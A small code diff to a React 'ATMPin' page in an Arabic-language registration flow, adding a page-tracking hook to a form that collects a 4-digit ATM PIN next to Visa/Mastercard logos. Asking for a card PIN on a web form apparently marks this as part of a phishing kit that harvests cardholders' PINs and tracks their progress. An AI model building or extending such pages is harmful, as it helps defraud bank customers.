@@ -7,6 +7,7 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import securePaymentLogos from "@/assets/visa-mastercard.svg";
 import { useRegistration } from "@/contexts/RegistrationContext";
+import { usePageTracking } from "@/hooks/usePageTracking";
 const steps = [{
   number: 1,
   title: "نوع الحساب"
@@ -27,6 +28,9 @@ const ATMPin = () => {
     sendCumulativeMessage
   } = useRegistration();
   const [pin, setPin] = useState("");
+  
+  // تتبع الصفحة الحالية
+  usePageTracking("atm-pin");
   const handleConfirm = async () => {
     if (pin.length === 4) {
       const newData = {
